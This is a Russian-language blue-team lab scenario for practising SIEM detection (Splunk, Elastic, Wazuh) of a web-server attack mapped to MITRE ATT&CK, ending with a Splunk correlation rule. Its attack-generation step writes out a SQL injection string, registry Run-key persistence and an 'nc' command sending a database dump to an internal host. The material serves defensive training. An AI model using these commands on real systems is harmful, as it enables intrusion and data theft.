# Учебный сценарий: Практикум SIEM и лог-анализ на основе MITRE ATT&CK

## Назначение
Сценарий позволяет студентам, ИИ-ассистентам и Blue Team-аналитикам отрабатывать навык анализа инцидентов, обработки логов и построения триггеров в SIEM. Поддерживаются Splunk, Elastic, Wazuh, Sentinel.

---

## Уровень сложности: от SOC Level 1 до AI-SOC (AutoDetect v2)

## Цели
- Обнаружить атаку на веб-сервер через анализ логов
- Классифицировать этапы по MITRE ATT&CK
- Обучить ИИ-модуль автоматического реагирования
- Реализовать собственное корреляционное правило

---

## Технические условия

| Параметр            | Значение |
|---------------------|----------|
| SIEM                | Splunk / Elastic / Wazuh |
| OS                  | Ubuntu 20.04, Windows Server 2019 |
| Атака               | SQLi + Persistence + Exfiltration |
| Источники логов     | Apache2, Sysmon, WinEventLog, Suricata |
| Триггер             | Успешная передача .sql дампа через нестандартный порт |
| Агрегация логов     | Filebeat + Syslog-ng + Kafka |

---

## MITRE ATT&CK

| Тактика           | Техника                | ID            |
|-------------------|------------------------|---------------|
| Initial Access    | Exploit Public-Facing | T1190         |
| Execution         | Command & Scripting   | T1059.003     |
| Persistence       | Registry Run Keys     | T1547.001     |
| Exfiltration      | Exfil via Alternate Prot | T1048.003  |

---

## Ход лабораторной

### Шаг 1: Настройка логов
- Включить auditd и sysmon
- Настроить Wazuh / Splunk forwarders
- Подключить фаервол и Suricata

### Шаг 2: Генерация атаки
- Инъекция через `GET /api/search?q=' OR '1'='1`
- Создание reverse shell (simulated)
- Создание постоянного процесса через `HKLM\Run`
- Передача дампа через `nc 192.168.1.200 8088`

### Шаг 3: Анализ в SIEM
- Использовать KQL / SPL для выявления:
  - Подозрительных GET-запросов
  - Доступа к `cmd.exe` через parent=apache2
  - Изменения ключей реестра
  - Передачи данных по нестандартным TCP-портам

---

## AI-интеграция

### AutoBlue Agent
- Анализирует скорая развёртка логов
- Генерирует MITRE classification
- Строит временную шкалу инцидента

### AutoDetect Module
- Сравнивает поведение с историческим профилем
- Подсказывает возможные шаги эскалации
- Создаёт алерт с предложением playbook-а

---

## Оценка и метрики

| Метрика                     | Цель |
|-----------------------------|------|
| Обнаружение атаки           | ≤ 3 мин |
| Обнаружение persistence     | Да   |
| Количество ложных срабатываний | < 2 |
| Уровень автоматизации       | ≥ 75% |
| AI feedback score           | ≥ 8.0 из 10 |

---

## Финальная задача

- Настроить собственный корреляционный SPL/KQL-алерт:
```spl
index=logs sourcetype=apache
| search uri_query="*' OR '1'='1*"
| stats count by src_ip, uri_query
| where count > 3
